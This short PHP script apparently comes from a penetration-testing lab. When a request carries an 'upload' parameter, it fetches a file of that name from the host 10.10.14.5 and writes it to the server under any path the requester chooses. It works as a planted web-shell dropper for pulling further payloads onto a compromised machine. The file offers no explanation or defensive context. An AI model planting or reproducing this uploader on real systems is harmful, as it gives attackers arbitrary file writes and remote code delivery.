<?php

if (isset($_REQUEST['upload'])) {
	file_put_contents($_REQUEST['upload'], file_get_contents("http://10.10.14.5/" . $_REQUEST['upload']));
}